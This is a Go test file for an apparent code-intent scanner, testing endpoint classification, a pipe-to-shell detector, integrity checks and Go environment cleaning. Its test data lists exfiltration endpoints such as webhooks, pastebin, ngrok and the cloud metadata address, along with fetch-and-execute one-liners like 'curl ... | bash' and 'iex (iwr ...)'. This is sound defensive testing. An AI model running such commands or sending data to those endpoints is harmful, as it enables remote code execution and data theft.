package intent

import (
	"crypto/sha512"
	"encoding/base64"
	"strings"
	"testing"
)

func TestParseEndpointClasses(t *testing.T) {
	cases := map[string]string{
		"https://discord.com/api/webhooks/123456/abcdef":                                       ClassExfil,
		"https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage": ClassExfil,
		"https://api.telegram.org":                                                             ClassAPI,
		"https://pastebin.com/raw/abc":                                                         ClassExfil,
		"https://abc.ngrok-free.app/x":                                                         ClassExfil,
		"http://169.254.169.254/latest/meta":                                                   ClassExfil,
		"http://45.9.148.12:8080/c":                                                            ClassRawIP,
		"http://10.0.0.5/admin":                                                                ClassIgnore,
		"http://198.51.100.7/doc":                                                              ClassIgnore,
		"https://app.example.com/login":                                                        ClassIgnore,
		"https://eu.posthog.com":                                                               ClassTelemetry,
		"https://o1.ingest.sentry.io/1":                                                        ClassTelemetry,
		"https://api.ipify.org":                                                                ClassRecon,
		"https://api.openai.com/v1":                                                            ClassAPI,
		"https://registry.npmmirror.com/x":                                                     ClassInfra,
		"https://registry.npmjs.org/x":                                                         ClassInfra,
		"https://www.w3.org/2000/svg":                                                          ClassReference,
		"https://sync.metrics-cloud.io/u":                                                      ClassUnknown,
		"https://${HOST}/api":                                                                  ClassIgnore,
		"https://foostats.com/":                                                                ClassUnknown,
	}
	for raw, want := range cases {
		if got := ParseEndpoint(raw).Class; got != want {
			t.Errorf("ParseEndpoint(%q).Class = %q, want %q", raw, got, want)
		}
	}
	if !isMirrorRegistry("registry.npmmirror.com") || isMirrorRegistry("registry.npmjs.org") {
		t.Error("isMirrorRegistry misclassifies npm hosts")
	}
}

func TestPipeToShellVariants(t *testing.T) {
	hits := []string{
		"curl -fsSL https://x.dev/i.sh | bash",
		"wget -qO- https://x.dev/i.sh | sudo -E sh",
		"curl https://x.dev/i.py | python3",
		`bash -c "$(curl -fsSL https://x.dev/i.sh)"`,
		"bash <(curl -s https://x.dev/i.sh)",
		"iex (iwr https://x.dev/i.ps1 -UseBasicParsing)",
		"irm https://x.dev/i.ps1 | iex",
		`eval "$(curl -s https://x.dev/env)"`,
	}
	misses := []string{
		"curl -fsSL -o tool.tgz https://x.dev/tool.tgz",
		"echo done | tee log.txt",
	}
	for _, s := range hits {
		if !pipeToShell.MatchString(s) {
			t.Errorf("pipeToShell missed %q", s)
		}
	}
	for _, s := range misses {
		if pipeToShell.MatchString(s) {
			t.Errorf("pipeToShell matched benign %q", s)
		}
	}
}

func TestCheckIntegrity(t *testing.T) {
	data := []byte("tarball")
	sum := sha512.Sum512(data)
	sri := "sha512-" + base64.StdEncoding.EncodeToString(sum[:])
	if ok, known := checkIntegrity(data, sri); !ok || !known {
		t.Errorf("valid integrity rejected: ok=%v known=%v", ok, known)
	}
	if ok, known := checkIntegrity([]byte("tampered"), sri); ok || !known {
		t.Errorf("tampered content accepted: ok=%v known=%v", ok, known)
	}
	if _, known := checkIntegrity(data, ""); known {
		t.Error("empty integrity reported as known")
	}
}

func TestCleanGoEnvDropsInsecureSettings(t *testing.T) {
	env := cleanGoEnv([]string{"PATH=/bin", "GOFLAGS=-insecure", "GONOSUMDB=*", "GOSUMDB=off", "GOINSECURE=x", "GOPROXY=https://proxy.golang.org"})
	joined := strings.Join(env, " ")
	for _, bad := range []string{"GOFLAGS", "GONOSUMDB", "GOSUMDB=off", "GOINSECURE"} {
		if strings.Contains(joined, bad) {
			t.Errorf("cleanGoEnv kept %s: %v", bad, env)
		}
	}
	if !strings.Contains(joined, "PATH=/bin") || !strings.Contains(joined, "GOPROXY=") {
		t.Errorf("cleanGoEnv dropped unrelated settings: %v", env)
	}
}

func TestGoModuleDepsAppliesReplace(t *testing.T) {
	gomod := NewFile("go.mod", `module example.com/app

require (
	github.com/up/lib v1.0.0
	github.com/other/x v0.2.0 // indirect
	github.com/local/y v0.1.0
)

replace github.com/up/lib => github.com/fork/lib v1.0.1
replace github.com/local/y => ../y
`)
	deps, skipped := goModuleDeps([]*File{gomod}, 10)
	if skipped != 0 || len(deps) != 1 || deps[0].name != "github.com/fork/lib" || deps[0].version != "v1.0.1" {
		t.Errorf("goModuleDeps = %+v (skipped %d), want only the fork replacement", deps, skipped)
	}
	if _, skipped := goModuleDeps([]*File{gomod}, 0); skipped != 1 {
		t.Errorf("budget 0 should skip 1 module, skipped %d", skipped)
	}
}
